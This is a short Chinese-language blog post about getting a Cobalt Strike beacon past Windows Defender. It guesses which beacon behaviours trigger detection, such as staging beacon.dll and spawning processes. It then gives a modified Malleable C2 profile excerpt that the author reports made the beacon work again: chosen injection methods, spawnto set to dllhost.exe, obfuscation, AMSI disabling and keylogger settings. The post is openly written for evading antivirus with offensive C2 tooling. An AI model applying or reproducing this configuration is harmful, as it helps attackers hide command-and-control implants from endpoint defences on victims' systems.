<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>难搞的Defender | Hurn's Blog</title><meta name="description" content="难搞的Defender - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">难搞的Defender</h1><div class="post-info"><a></a>2022-06-12</div><div class="post-content"><p>静态处理过的程序，运行之后会因为一些CS的行为被杀，正常上线不操作没问题（前提要配置一份profile），当执行命令或者执行其他job的时候被杀，而且还能识别出来是CobaltStrike的行为。</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220601192347325.png" alt="image-20220601192347325"></p>
<p>目前猜测有两个可能是特征，一是在shellcode下载beacon.dll回来运行CreateThread加载运行的时候，比如下面这个wwanmm.dll（看实际profile中的stage配置）</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220601193230511.png" alt="image-20220601193230511"></p>
<p>另外就是spawn进程的时候也很可疑</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220601192642827.png" alt="image-20220601192642827"></p>
<p>处理下配置文件，换个虚拟机</p>
<pre><code class="txt">    execute &#123;
        #start address does not point to the current process space, fires SYSMON 8 events

        #self injection
        CreateThread &quot;ntdll!RtlUserThreadStart+0x42&quot;;
        CreateThread &quot;ntdll.dll!RtlUserThreadStart&quot;;
        CreateThread;

        #suspended process in post-ex jobs, takes over primary thread of temp process
        # SetThreadContext;

        #early bird technique, creates a suspended process, queues an APC call to the process, resumes main thread to execute the APC.
        NtQueueApcThread-s;

        #uses an RWX stub, uses CreateThread with start address that stands out, same arch injection only.
        #NtQueueApcThread;

        #no cross session
        CreateRemoteThread &quot;kernel32.dll!LoadLibraryA+0x1000&quot;;

        #uses an RWX stub, fires SYSMON 8 events, does allow x86-&gt;x64 injection.
        #c2lint msg -&gt; .process-inject.execute RtlCreateUserThread will cause unpredictable behavior with cross-session injects on XP/200
        RtlCreateUserThread;
    &#125;

post-ex &#123;
    # Optionally specify non-existent filepath to force manual specification based on the Beacon host&#39;s running processes
    set spawnto_x86 &quot;%windir%\\syswow64\\dllhost.exe&quot;;
    # Hardcode paths like C:\\Windows\\System32\\dllhost.exe to avoid potential detections for %SYSNATIVE% use. !! This will break when attempting to spawn a 64bit post-ex job from a 32bit Beacon.
    set spawnto_x64 &quot;%windir%\\sysnative\\dllhost.exe&quot;;
    # change the permissions and content of our post-ex DLLs
    set obfuscate &quot;true&quot;;
    # pass key function pointers from Beacon to its child jobs
    set smartinject &quot;true&quot;;
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable &quot;true&quot;;
    # Modify our post-ex pipe names
    set pipename &quot;Win32\\StateListener-###-0,&quot;;
    set keylogger &quot;GetAsyncKeyState&quot;;
    #set threadhint &quot;module!function+0x##&quot;
&#125;
</code></pre>
<p>可以看到又正常能用了</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220606233352776.png" alt="image-20220606233352776"></p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220606233341329.png" alt="image-20220606233341329"></p>
<p>!</p>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/06/12/%E5%86%85%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/">prev</a><a class="next" href="/2022/06/11/%E5%86%85%E7%BD%91/%E5%9F%9F%E5%86%85%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>